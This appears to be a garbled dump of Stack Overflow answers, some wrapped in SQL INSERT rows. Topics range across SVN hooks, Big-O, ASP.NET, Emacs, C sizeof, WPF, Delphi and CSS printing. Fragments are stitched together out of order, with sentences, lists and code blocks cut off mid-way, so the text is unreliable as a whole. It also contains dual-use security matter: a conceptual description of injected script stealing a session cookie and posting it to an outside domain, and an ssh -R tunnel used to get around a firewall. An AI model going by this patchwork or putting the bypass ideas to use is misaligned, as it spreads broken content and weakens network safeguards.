<p>Once, or if, the project gets functional you can use it to introduce refactoring tools. Its good if you can then expand the project with some simple features which you never planned for. This usually means refactoring and significant debugging, since very few people write even half decent code their first time.</p>

<p>Some projects:</p>

<ul>
<li>Hangman game</li>
<li>Experimenting with robotics(<a href="http://www.vexlabs.com" rel="nofollow noreferrer">Vex</a> and <a href="http://mindstorms.lego.com" rel="nofollow noreferrer">Mindstorms</a> are options) </li>
</ul>

<p>3) <b>Real Project </b> Start a real project which may take some time. Use proper source control, and make a point to have a schedule. Run this project like a real project, if nothing else its good experience having to deal with the tools.</p>

<p>Obviously you need to adjust this for each person. The most important thing I''ve found is to make even the first simple apps apply to what the person is interested in. </p>

<li>Tetris</li>

<li><p>Download "post-commit.bat" and the VBScript file for Subversion</p></li>
<li><p>Create a "hooks" directory in a common easily accessed location (preferably with no spaces in the file path)</p></li>
<li><p>Place a copy of the files in the hooks directories</p></li>
<li><p>Rename the files without the ".safe" extension</p></li>
<li><p>Right click on any directory.</p></li>

<li><p>Hook Type: Post-Commit Hook </p></li>
<li><p>Working Copy Path: C:\\Projects (or whatever your root directory for all of your projects is. If you have multiple you will need to do this step for each one.) </p></li>
<li><p>Command Line To Execute: C:\\subversion\\hooks\\post-commit.bat (this needs to point to wherever you put your hooks directory from step 3)</p></li>

<h2>Configure the Properties</h2>

<ol start="2">
<li><p>Once again, Right click on the root directory of the checked out
project you want to work with (you need to do this "configure the properties" step for each project -- See "Migrating Properties Between Projects" below)</p></li>

<h2>Commiting Changes and Viewing the Logs</h2>

<p>Now when you are commiting, you can specify one bug that the commit addresses. This kind of forces you to commit after fixing each bug...</p>

<p><img src="https://i.stack.imgur.com/pGnHL.png" alt="specifying bug addressed when commiting"></p>

<p>When you view the log (Right click root of project, TortoiseSVN > show log) you can see the bug id that each checking corresponds to (1), and you can click the bug id number to be taken to fogbugz to view that bug automatically if you are looking at the actual log message. Pretty nifty!</p>

With that said I must add that even the professor encouraged us (later on) to actually <em>think</em> about it instead of just calculating it.</p>

<p>Also I would like to add how it is done for <strong>recursive functions</strong>:</p>

<p>suppose we have a function like (<a href="http://plt-scheme.org/" rel="noreferrer">scheme code</a>):</p>

<pre><code>(define (fac n)
    (if (= n 0)
        1
            (* n (fac (- n 1)))))
</code></pre>

<p>which recursively calculates the factorial of the given number.</p>

<p>The first step is to try and determine the performance characteristic for <em>the body of the function only</em> in this case, nothing special is done in the body, just a multiplication (or the return of the value 1).</p>

<p>So the <strong>performance for the body is: O(1)</strong> (constant).</p>

<p>Next try and determine this for the <em>number of recursive calls</em>. In this case we have n-1 recursive calls.</p>

<p>So the <strong>performance for the recursive calls is: O(n-1)</strong> (order is n, as we throw away the insignificant parts).</p>

<p>Then put those two together and you then have the performance for the whole recursive function:  </p>

<p><strong>1 * (n-1) = O(n)</strong></p>

INSERT INTO answers VALUES (5219,'<p>Here''s how I solved this problem today.  I started from <a href="http://www.c-sharpcorner.com/UploadFile/desaijm/ASP.NetPostURL11282005005516AM/ASP.NetPostURL.aspx" rel="nofollow noreferrer">this article</a> on C# Corner, but found the example - while technically sound - a little incomplete.  Everything he said was right, but I needed to hit a few external sites to piece this together to work exactly as I wanted.</p>

<p>It didn''t help that the user was not technically submitting a form at all; they were clicking a link to go to our support center, but to log them in an http post had to be made to the support center''s site.</p>

<p>This solution involves using <code>HttpContext.Current.Response.Write()</code> to write the data for the form, then using a bit of Javascript on the <code>&lt;body onload=""&gt;</code> method to submit the form to the proper URL.</p>

<p>When the user clicks on the Support Center link, the following method is called to write the response and redirect the user:</p>

<pre><code>public static void PassthroughAuthentication()
{

    System.Web.HttpContext.Current.Response.Write("&lt;body 
    onload=document.forms[0].submit();window.location=\"Home.aspx\";&gt;");

    System.Web.HttpContext.Current.Response.Write("&lt;form name=\"Form\" 
    target=_blank method=post 
    action=\"https://external-url.com/security.asp\"&gt;");

    System.Web.HttpContext.Current.Response.Write(string.Format("&lt;input 
       type=hidden name=\"cFName\" value=\"{0}\"&gt;", "Username"));

    System.Web.HttpContext.Current.Response.Write("&lt;/form&gt;");
    System.Web.HttpContext.Current.Response.Write("&lt;/body&gt;");
}
</code></pre>

<p>The key to this method is in that onload bit of Javascript, which , when the body of the page loads, submits the form and then redirects the user back to my own Home page.  The reason for that bit of hoodoo is that I''m launching the external site in a new window, but don''t want the user to resubmit the hidden form if they refresh the page.  Plus that hidden form pushed the page down a few pixels which got on my nerves.</p>

<p>I''d be very interested in any cleaner ideas anyone has on this one.</p>

<p>The scary thing though is that the virus looks to the system tables for values to infect and a lot of shared hosting plans also share the database space for their clients. So most likely it wasn''t even your dad''s site that was infected, but somebody else''s site within his hosting cluster that wrote some poor code and opened the door to SQL Injection attack.</p>

<p>If he hasn''t done so yet, I''d send an URGENT e-mail to their host and give them a link to that SQL code to fix the entire system. You can fix your own affected database tables, but most likely the bots that are doing the infection are going to pass right through that hole again and infect the whole lot.</p>

<p>Hopefully this gives you some more info to work with.</p>

<p>When executing a macro, it''s a little different... incremental searches will just happen once, and you will have to execute the macro again if you want to search again.  You can do more powerful and complex things though, such as search for a keyword, jump to the beginning of the line, mark, go to end of the line, M-w (to copy), then jump to another buffer, then C-y (paste), then jump back to the other buffer and end your macro.  Then, each time you execute the macro you will be copying a line to the next buffer.</p>

<p>The really cool thing about emacs macros is it will stop when it sees the bell... which happens when you fail to match an incremental search (among other things).  So the above macro, you can do C-u 1000 C-x e which will execute the macro 1000 times... but since you did a search, it will only copy 1000 lines, OR UNTIL THE SEARCH FAILS!  Which means if there are 100 matches, it will only execute the macro 100 times.</p>

     categoryListDropdown.Items.AddRange(listItems.ToArray());
}
</code></pre>

<p>to populate the intial dropdown in the data grid. You can also access item.Cells[0].text to get the RuleID in this case.</p>

<p>Notes for myself: The ASP.NET model does everything in the codebehind file. At a high level you can always iterate through GridView1.Items to get each row, and item.findControl("ControlID") to query the value stored at each item, such as after pressing an "Update" button.</p>',109,15,'2008-08-15T23:11:50.100Z',77,58);

This allows you to both extend interfaces and also have a class that implements multiple interfaces (both allowed, and very useful in many cases) without worrying about having to satisfy a particular constructor.</p>

<p><em>EDIT:</em></p>

<p><em>Here''s my new model:</em></p>

<p><em>A. Each interface no longer has a constructor method.</em><br>
<em>B. All Shippers (UPS, FedEx, etc) now implement iShipper (which extends iVendor) and extend the abstract class Shipper (which has all common non-abstract methods for shippers defined in it, getName(), getZip() etc).</em><br>
<em>C. Each Shipper has it''s own unique _construct method which overwrites the abstract __construct($vendors_no = null, $shipment = null) method contained in Shipper (I don''t remember why I''m allowing those to be optional now though. I''d have to go back through my documentation...).</em></p>

<p>So:</p>

<pre><code>interface iVendor{
    public function getName();
    public function getVendors_no();
    public function getZip();
    public function getCountryCode();
    public function setName($name);
    public function setVendors_no($vendors_no);
    public function setZip($zip);
    public function setCountryCode($countryCode);
}

interface iShipper extends iVendor{
    public function getTransitTime($shipment = null);
    public function getTransitCost($shipment = null);
    public function getCurrentShipment();
    public function setCurrentShipment($shipment);
    public function getStatus($shipment = null);
}

abstract class Shipper implements iShipper{  
    abstract public function __construct($vendors_no = null, $shipment = null);  
    //a bunch of non-abstract common methods...  
}

class FedEx extends Shipper implements iShipper{  
    public function __construct($vendors_no = null, $shipment = null){

  <p>When either the

  instance of the Database Engine stores
  a version of the previously committed
  image of the row in tempdb. Each
  version is marked with the transaction
  sequence number of the transaction
  that made the change. The versions of
  modified rows are chained using a link
  list. The newest row value is always
  stored in the current database and
  chained to the versioned rows stored
  in tempdb.</p>
  
  <p>For short-running transactions, a
  version of a modified row may get
  cached in the buffer pool without
  getting written into the disk files of
  the tempdb database. If the need for
  the versioned row is short-lived, it
  will simply get dropped from the
  buffer pool and may not necessarily
  incur I/O overhead.</p>

<p>There appears to be a slight performance penalty for the extra overhead, but it may be negligible.  We should test to make sure.</p>

<p>Try setting this option and REMOVE all NOLOCKs from code queries unless it''s really necessary.  NOLOCKs or using global methods in the database context handler to combat database transaction isolation levels are Band-Aids  to the problem.  NOLOCKS will mask fundamental issues with our data layer and possibly lead to selecting unreliable data, where automatic select / update row versioning appears to be the solution.</p>

INSERT INTO answers VALUES (29092,'<p>Yes, HTTP-Only cookies would be fine for this functionality.  They will still be provided with the XmlHttpRequest''s request to the server.</p>

<p>In the case of Stack Overflow, the cookies are automatically provided as part of the XmlHttpRequest request.  I don''t know the implementation details of the Stack Overflow authentication provider, but that cookie data is probably automatically used to verify your identity at a lower level than the "vote" controller method.</p>

<p>More generally, cookies are <strong>not</strong> required for AJAX.  XmlHttpRequest support (or even iframe remoting, on older browsers) is all that is technically required.</p>

<p>However, if you want to provide security for AJAX enabled functionality, then the same rules apply as with traditional sites.  You need some method for identifying the user behind each request, and cookies are almost always the means to that end.</p>

<blockquote>
  <p>In your example, I cannot write to your document.cookie, but I can still steal your cookie and post it to my domain using the XMLHttpRequest object.</p>
</blockquote>

<p>XmlHttpRequest won''t make cross-domain requests (for exactly the sorts of reasons you''re touching on).</p>

<p>You could normally inject script to send the cookie to your domain using iframe remoting or JSONP, but then HTTP-Only protects the cookie again since it''s inaccessible.</p>

<p>Unless you had compromised StackOverflow.com on the server side, you wouldn''t be able to steal my cookie.</p>

<blockquote>
  <p>Edit 2: Question 2. If the purpose of Http-Only is to prevent JavaScript access to cookies, and you can still retrieve the cookies via JavaScript through the XmlHttpRequest Object, what is the point of Http-Only?</p>
</blockquote>

<p>Consider this scenario:</p>

<ul>
<li>I find an avenue to inject JavaScript code into the page.</li>
<li>Jeff loads the page and my malicious JavaScript modifies his cookie to match mine.</li>
<li>Jeff submits a stellar answer to your question.</li>
<li>Because he submits it with my cookie data instead of his, the answer will become mine.</li>
<li>You vote up "my" stellar answer.</li>
<li>My real account gets the point.</li>
</ul>

<p>With HTTP-Only cookies, the second step would be impossible, thereby defeating my XSS attempt.</p>

<blockquote>
  <p>Edit 4: Sorry, I meant that you could send the XMLHttpRequest to the StackOverflow domain, and then save the result of getAllResponseHeaders() to a string, regex out the cookie, and then post that to an external domain. It appears that Wikipedia and ha.ckers concur with me on this one, but I would love be re-educated...</p>
</blockquote>

<p>That''s correct.  You can still session hijack that way.  It does significantly thin the herd of people who can successfully execute even that XSS hack against you though.</p>

<p>However, if you go back to my example scenario, you can see where HTTP-Only <em>does</em> successfully cut off the XSS attacks which rely on modifying the client''s cookies (not uncommon).</p>

<p>It boils down to the fact that a) no single improvement will solve <em>all</em> vulnerabilities and b) no system will <em>ever</em> be completely secure.  HTTP-Only <strong>is</strong> a useful tool in shoring up against XSS.</p>

<p>Similarly, even though the cross domain restriction on XmlHttpRequest isn''t 100% successful in preventing all XSS exploits, you''d still never dream of removing the restriction.</p>',60,18,'2008-08-26T22:24:56.563Z',87,20);

<pre><code>int a[17];

<hr>

<p><strong>Full answer:</strong></p>

<p>To determine the size of your array in bytes, you can use the <code>sizeof</code>
operator:</p>

<pre><code>int a[17];
size_t n = sizeof(a);
</code></pre>

<p>On my computer, ints are 4 bytes long, so n is 68.</p>

<p>To determine the number of elements in the array, we can divide
the total size of the array by the size of the array element.
You could do this with the type, like this:</p>

<pre><code>int a[17];
size_t n = sizeof(a) / sizeof(int);
</code></pre>

<p>and get the proper answer (68 / 4 = 17), but if the type of
<code>a</code> changed you would have a nasty bug if you forgot to change
the <code>sizeof(int)</code> as well.</p>

<p>So the preferred divisor is <code>sizeof(a[0])</code> or the equivalent <code>sizeof(*a)</code>, the size of the first element of the array.</p>

<pre><code>int a[17];
size_t n = sizeof(a) / sizeof(a[0]);
</code></pre>

<p>Another advantage is that you can now easily parameterize
the array name in a macro and get:</p>

<pre><code>#define NELEMS(x)  (sizeof(x) / sizeof((x)[0]))

int a[17];
size_t n = NELEMS(a);

<pre><code>ssh -R 8022:myinsideserver:22 paul@myoutsideserver

<p>The difference is what machine you are connecting to/from.  My boss showed me this trick not too long ago, and it is definitely really nice to know... we were behind a firewall and needed to give external access to a machine... he got around it by ssh -R to another machine that was accessible... then connections to that machine were forwarded into the machine behind the firewall, so you need to use -R or -L based on which machine you are on and which you are ssh-ing to.</p>

<p>Also, I''m pretty sure you are fine to use a regular user as long as the port you are forwarding (in this case the 8022 port) is not below the restricted range (which I think is 1024, but I could be mistaken), because those are the "reserved" ports.  It doesn''t matter that you are forwarding it to a "restricted" port because that port is not being opened (the machine is just having traffic sent to it through the tunnel, it has no knowledge of the tunnel), the 8022 port IS being open and so is restricted as such.</p>

<p>EDIT: Just remember, the tunnel is only open so long as the initial ssh remains open, so if it times out or you exit it, the tunnel will be closed.</p>',122,34,'2008-09-05T05:10:58.230Z',25,50);

<p>It''s been a month since I started using Vim as my main ''GUI''

curve was indeed a bit steep but after a while and with the
right options turned on and <a href="http://ctags.sourceforge.net/" rel="nofollow noreferrer">scripts running</a> I really
got the hang of it!</p>

<p>I love the way how you can shape Vim to suite your needs;
just add/change <a href="http://www.vim.org/htmldoc/map.html" rel="nofollow noreferrer">key mappings</a> and Vim is turned into a
highly productive ''IDE''.</p>

<p>The toolchain to build and compile a C++ program on Linux is
also really intuitive. make and g++ are <em>the</em> tools you''ll
use.</p>

<p>The <a href="http://www.gnu.org/software/ddd/" rel="nofollow noreferrer">debugger ddd</a> is however not really that good, but
maybe that''s because I haven''t had the time to master it
properly.</p>

<p>So to anyone who is, or was looking for a good C++ IDE in
Linux, just like I was, your best bet lays with the standard
available tools in Linux itself (Vim, g++, ddd) and you
should really at least try to use them, before looking for
sonething else...</p>

Select the tab with the name of the current project, and choose the form you want to inherit from. If you want to inherit from a form that''s not part of the current project, open that form, right click it, and choose Add to Repository.

<p>Given that, I came across issues because some of the descendant forms were already created, so I couldn''t follow the process above. Also, I made some changes to forms from the standard code Delphi creates. I was able to resolve all issues with visual form inheritance using the following guidelines:</p>

<ul>
<li>The .pas file of the descendant form must have the form''s class inherit from the correct ancestor class, e.g.:<br>
<code>type TMyForm = class(TAncestorForm)</code></li>
<li>The first line in the .dfm of the descendant form must have the word <code>inherited</code> instead of <code>object</code>, e.g.:<br>
<code>inherited MyForm: TMyForm</code></li>
<li><strong>EDIT: After double checking, the following is NOT required:</strong> <em>The .pas file of the ancestor form must have the standard global variable that Delphi creates, e.g.:<br>
<code>var AncestorForm: TAncestorForm;</code></em></li>
<li>The <code>uses</code> section of the .dpr file of the project must have that same global variable as a comment after the unit''s file name, e.g.:<br>
<code>unAncestor in ''unAncestor.pas'' {AncestorForm}</code></li>
</ul>

<p>Notes/Tips:</p>

<ul>
<li>Both the ancestor form and the descendant form are allowed to be non-auto created if you want (Set in Project > Options > Forms > Auto-create forms).</li>

<li>To revert all property values of a component to the ancestor''s values, right click the component and choose Revert to inherited.</li>

<p>I looked at the samples here, dug off a few of the references from other posts here, and found the answer... IValueConverter ... an interface that can be used with WPF that will convert values at the point of binding. It is a little tricky to put together at first, but not that difficult.</p>

<p>The first step is to create a simple lookup or converter class that implements the IValueConverter interface. For my solution, I did this:</p>

<pre><code>Namespace TCRConverters

   Public Class SetIdToNameConverter
      Implements IValueConverter

      Public Function Convert(ByVal value As Object, ByVal targetType As System.Type, ByVal parameter As Object, ByVal culture As System.Globalization.CultureInfo) As Object Implements System.Windows.Data.IValueConverter.Convert
         Dim taCardSet As New TCRTableAdapters.CardSetTableAdapter
         Return taCardSet.GetDataById(DirectCast(value, Integer)).Item(0).Name
      End Function

      Public Function ConvertBack(ByVal value As Object, ByVal targetType As System.Type, ByVal parameter As Object, ByVal culture As System.Globalization.CultureInfo) As Object Implements System.Windows.Data.IValueConverter.ConvertBack
         Return Nothing
      End Function

   End Class

End Namespace
</code></pre>

<p><em>Note: I am not utilizing the ConvertBack method, but it is required by the interface.</em></p>

<p>From there you need to add a reference to the namespace in your XAML header section:</p>

<pre><code>&lt;Window x:Class="Main" Loaded="Main_Loaded"
    // Standard references here...
    xmlns:c="clr-namespace:TCR_Editor.TCRConverters"
    Title="TCR Editor" Height="728" Width="1135" Name="Main"&gt;
</code></pre>

<p>Then in your Windows.Resources section, you can reference the converter, and in my case, I created a static reference to the CollectionViewSource that would be storing the data:</p>

<pre><code>&lt;Window.Resources&gt;
   &lt;CollectionViewSource Source="{Binding Source={x:Static Application.Current}, Path=CardDetails}" x:Key="CardDetails"&gt;         
   &lt;/CollectionViewSource&gt;

   &lt;c:SetIdToNameConverter x:Key="SetConverter"/&gt;      
&lt;/Window.Resources&gt;
</code></pre>

<p>Then finally, in the ListView that was part of the initial problem, you add the converter reference:</p>

<pre><code>&lt;ListView Canvas.Left="402" Canvas.Top="480" Height="78" ItemsSource="{Binding}" Name="lsvViewEditCardPrint" Width="419"&gt;
   &lt;ListView.View&gt;
      &lt;GridView&gt;
         &lt;GridViewColumn DisplayMemberBinding="{Binding Path=IdCst, Converter={StaticResource SetConverter}}"&gt;Set&lt;/GridViewColumn&gt;
         // Other Columns here...
      &lt;/GridView&gt;
   &lt;/ListView.View&gt;
&lt;/ListView&gt;
</code></pre>

<p>So the great part now is that when I trigger an event that has a Card Id, all I need to do is reset set the CollectionViewSource...</p>

<pre><code>DirectCast(Me.FindResource("CardDetails"), CollectionViewSource).Source = taCardDetails.GetDataById(CardId)
</code></pre>

<p>...and all the binding elements of WPF do the rest!</p>

<p>The nice thing about is is that I can easily create other converters, add them to various DataTemplates or columns elsewhere in the application, and once I get all of the data into the WPF app itself, the conversions can be conducted without going to the database.</p>',71,67,'2008-10-23T18:48:45.517Z',92,8);

But, in an effort to provide a more detailed answer, I''m posting my solution here.</p>

<p><strong>The Solution!</strong></p>

<p>Create two web applications, or websites, or whatever.</p>

<p><strong>Application A</strong> is a simple web application.  The purpose of this application is to receive file uploads and save them to the proper place. Set this up as an anonymous access allowed. Then make a single ASPX page that accepts posted files and saves them to a given location. (I''m doing this on an intranet. Internet sites may be exposing themselves to security issues by doing this. Take extra precautions if that is the case.) The code behind for this page would look something like this:</p>

<pre><code>Dim uploads As HttpFileCollection = HttpContext.Current.Request.Files
If uploads.Count &gt; 0 Then
    UploadFiles(uploads)
Else
    result = "error"
    err = "File Not Uploaded"
End If
</code></pre>

<p><strong>Application B</strong> is your primary site that will allow file uploads. Set this up as an authenticated web application that does not allow anonymous access. Then, place the <a href="http://digitarald.de/journal/54706744/fancyupload-for-flash-10/#comments" rel="nofollow noreferrer">FancyUpload</a> (or similar solution) on a page on this site. Configure it to post its files to Application A''s upload ASPX page.</p>',106,86,'2008-10-27T15:35:07.910Z',92,43);

Using <a href="http://www.ikvm.net/" rel="noreferrer">IKVM</a> you can <a href="http://www.apache.org/dyn/closer.cgi/lucene/java/" rel="noreferrer">download Lucene</a>, get the .jar file, and run:</p>

<pre><code>ikvmc -target:library &lt;path-to-lucene.jar&gt;
</code></pre>

<p>which generates a .NET dll like this: lucene-core-2.4.0.dll</p>

<p>You can then just reference this DLL from your project and you''re good to go! There are some java types you will need, so also reference IKVM.OpenJDK.ClassLibrary.dll. Your code might look a bit like this:</p>

<pre><code>QueryParser parser = new QueryParser("field1", analyzer);
java.util.Map boosts = new java.util.HashMap();
boosts.put("field1", new java.lang.Float(1.0));
boosts.put("field2", new java.lang.Float(10.0));

MultiFieldQueryParser multiParser = new MultiFieldQueryParser
                      (new string[] { "field1", "field2" }, analyzer, boosts);
multiParser.setDefaultOperator(QueryParser.Operator.OR);

Query query = multiParser.parse("ABC");
Hits hits = isearcher.search(query);
</code></pre>

<p>I never knew you could have Java to .NET interoperability so easily. The best part is that C# and Java is "almost" source code compatible (where Lucene examples are concerned). Just replace <code>System.Out</code> with <code>Console.Writeln</code> :).</p>

<p>=======</p>

<p>Update: When building libraries like the Lucene highlighter, make sure you reference the core assembly (else you''ll get warnings about missing classes). So the highlighter is built like this:</p>

INSERT INTO answers VALUES (306595,'<p>So some more poking around and I figured out the issue. Part of the problem arises from the fact that the div layout I setup to create two separate columns is using the position:relative and float:right/left attributes. </p>

<p>From what I''ve read, as soon as you start augmenting the position attribute of a div tag, it affects the z-index of the rendering, which only gets complicated when the calendar control is "popping up" dynamically.</p>

<p>Unfortunately there is no Z-Index attribute to the CalendarExtender, unless you want to write an entire style for the calendar, which I don''t want to do. However, you can extend the default style by adding the following to your CSS file:</p>

<pre><code>.ajax__calendar_container { z-index : 1000 ; }
</code></pre>

<p>If you aren''t using a CSS file, you can also add this into the head section of your page:</p>

<pre><code>&lt;style type="text/css"&gt;
   .ajax__calendar_container { z-index : 1000 ; }
&lt;/style&gt;
</code></pre>

<p>and that should do the trick. It worked for me. </p>

<p>If for some reason this doesn''t work (and some people were still reporting problems), a little more "aggressive" approach was to wrap the input fields and CalendarExtender in a DIV tag and then add the following to your CSS file / HEAD section:</p>

<pre><code>.ajax__calendar {
    position: relative;
    left: 0px !important;
    top: 0px !important;
    visibility: visible; display: block;
}
.ajax__calendar iframe
{
    left: 0px !important;
    top: 0px !important;

</blockquote>

<p>No, hardware and compilers are irrelevant for my testing purposes. I''m just looking for some good problems that can test how well code, written in one language, can compete against code from another language. I''m really testing the constructs available in the specific languages to do concurrent programming. And one of the criteria is performance (measured in time).</p>

<p>Some of the other test criteria I''m looking for are:</p>

<ul>
<li>how <em>easy</em> is it to write correct code; because as we all know concurrent programming is harder then writing single threaded programs</li>
<li>what is the technique used to to concurrent programming: event-driven, actor based, message parsing, ...</li>
<li>how much code must be written by the programmer himself and how much is done automatically for him: this can also be tested with the given benchmark problems</li>
<li>what''s the level of abstraction and how much overhead is involved when translated back to machine code</li>
</ul>

<p>So actually, I''m not looking for performance as <em>the</em> only and best parameter (which would indeed send me to the hardware and the compilers instead of the language itself), I''m actually looking from a programmers point of view to check what language is best suited for what kind of problems, what it''s weaknesses and strengths are and so on...</p>

<p>Bare in mind that this is just a small project and the tests are therefore to be kept small as well. (rigorous testing of everything is therefore not feasible)</p>',46,25,'2008-11-29T09:44:26.490Z',45,34);

<p>I''ve tested it with gcc under Linux, but I''m sure it works under other compilers/Operating Systems as well. To get it to work you have to enter some command line arguments like so:</p>

<blockquote>
  <p>mandelbrot 106 500 255 1</p>
</blockquote>

<p>the first argument is the width (x-axis)<br>
the second argument is the height (y-axis)<br>
the third argument is the number of maximum iterations (the number of colors)<br>
the last ons is the number of threads (but that one is currently not used)</p>

<p>on my resolution, the above example gives me a nice ASCII-art representation of a Mandelbrot set. But try it for yourself with different arguments (the first one will be the most important one, as that will be the width)</p>',46,66,'2008-11-29T19:08:57.193Z',22,87);

INSERT INTO answers VALUES (352856,'<p>Thanks. My problem with these attempts is that they are not guaranteed to be globally unique, as <a href="http://blogs.msdn.com/oldnewthing/archive/2008/06/27/8659071.aspx" rel="nofollow noreferrer">Raymond Chen</a> pointed out. I was wondering if there is another algorithm that generates GUIDs that are unique. I remember that there used to be implementations that used a Timestamp and/or the NIC MAC Address, but they are not used anymore since they are not cryptographic strong and/or there were privacy concerns.</p>

<p>I wonder: If I just make up my own, i should be fine? According to <a href="http://en.wikipedia.org/wiki/GUID" rel="nofollow noreferrer">Wikipedia</a>:</p>

<blockquote>
  <p>One to three of the most significant bits of the second byte in Data 4 define the type variant of the GUID:</p>
  
  <p>Pattern Description<br>
  0 Network Computing System backward compatibility<br>
  10 Standard<br>
  110 Microsoft Component Object Model backward compatibility; this includes the GUID''s for important interfaces like IUnknown and IDispatch.<br>
  111 Reserved for future use.  </p>
  
  <p>The most significant four bits of Data3 define the version number, and the algorithm used.</p>
</blockquote>

<p>So if I make up something in Data3/Data4, i would normally create my own implementation that should not clash with any other GUID, but of course there is always a bit of risk associated with that, so before I do that I wanted to check if there is an older/not anymore used algorhithm that generates true Unique Ids.</p>',91,37,'2008-12-09T14:17:45.433Z',92,53);

INSERT INTO answers VALUES (376985,'<p>I did a bunch of experimenting with some really weird results. But I did make some changes so I can work on my project without this issue occurring. I had to disable the AutoSave feature (this prevents secondary forms which may reference the main form from opening up before the main form). Then I had to make sure to delete the .dsk file of the project (the project desktop AutoSave file). So now when I open up the project it always opens the main form, so I never get the issue of references to the main form getting cleared. But I do still get the issue if after opening the project I close the main form and then open a form that references the main form.</p>

<p>Also I was unable to reproduce this issue of references to another form getting cleared in a brand new project with the AutoSave feature disabled, even though I can reproduce it w/AutoSave disabled in my current project. I have no idea why, but I don''t feel like this is worth investigating further.</p>

<p>Below is the data on some of my experiments performed on my existing project. WORKS means the reference to the main form is fine. BUG means the reference to the main form got cleared. This was done w/AutoSave on and always closing all forms manually before I closed the project.</p>

<p>Other interesting findings:</p>

<ul>
<li>When you open up the form and the image list does not show up, the .dfm is modified however delphi does not say that the file is modified (e.g. if you close the form it won''t warn you about unsaved changes).
Only once you press save on the form will the dfm clear the imagelist reference.</li>
<li>I noticed there are some "magic" forms in my project (for lack of a better term). Magic forms reference my project''s main form in their .dfm and they don''t lose their references to the main form after you Open them, even if they are opened before any other form.</li>
<li>These magic forms cause the "caching" of all image list references from the main form. Once you open one of these forms, then you can open up any form that references the main form, and it won''t lose it''s references during this project session (even if the magic form is then closed).</li>

<blockquote>
  <p>CSS 2.1 no longer specifies the size attribute. The current working
  draft for CSS3 Paged Media module does specify it (but this is not
  standard or accepted).</p>
</blockquote>

<p>As stated the size option comes from the <a href="http://www.w3.org/TR/css3-page/#page-size" rel="noreferrer">CSS 3 Draft Specification</a>. In theory it can be set to both a page size and orientation although in my sample the size is omitted.</p>

<p>The support is very mixed with a <a href="https://developer.mozilla.org/en/Mozilla_CSS_support_chart#section_3" rel="noreferrer">bug report begin filed in firefox</a>, most browsers do not support it. </p>

<p>It may seem to work in IE7 but this is because IE7 will remember the users last selection of landscape or portrait in print preview (only the browser is re-started).</p>

<p><a href="https://web.archive.org/web/20090228163159/http://edacio.us:80/forum/comments.php?DiscussionID=39" rel="noreferrer">This article</a> does have some suggested work arounds using JavaScript or ActiveX that send keys to the users browser although it they are not ideal and rely on changing the browsers security settings. </p>

<p>Alternately you could rotate the content rather than the page orientation. This can be done by creating a style and applying it to the body that includes these two lines but this also has draw backs creating many alignment and layout issues.</p>

<pre><code>&lt;style type="text/css" media="print"&gt;
    .page
    {
     -webkit-transform: rotate(-90deg); 
     -moz-transform:rotate(-90deg);
     filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=3);
    }
&lt;/style&gt;
</code></pre>

<p>The final alternative I have found is to create a landscape version in a PDF. You can point to so when the user selects print it prints the PDF. However I could not get this to auto print work in IE7.</p>

<pre><code>&lt;link media="print" rel="Alternate" href="print.pdf"&gt;
</code></pre>

<p>In conclusion in some browsers it is relativity easy using the @page size option however in many browsers there is no sure way and it would depend on your content and environment. 
This maybe why Google Documents creates a PDF when print is selected and then allows the user to open and print that.</p>',33,37,'2009-09-08T08:50:50.727Z',97,18);

Man, this was a weird one. The problem was that the actual ASP file was encoded in ANSI. Apparently this is what encoding is used when the file is passed to the client (kinda makes sense if you remember that an asp file is just a file being passed to the client that is modified slightly by the asp engine). The solution was to change the encoding of the ASP file to utf-8. Thus, when the utf-8 characters are written into the file on its way to the client, they match the encoding of the rest of the file and are read by the browser correctly. </p>

<p>Hope this helps the next person.<br>

<p>I tried including script.xsl as another xml chunk and changing the import statement in every way I could imagine but without success. </p>

<p>Since the absolute url for includeing script.xsl worked from the beginning, my final solution was to convert style.xsl to style.asp with the correct doctype. In this file I was then able to retrieve the server name, protocol and path and echo them into the right place in the import statement using asp.
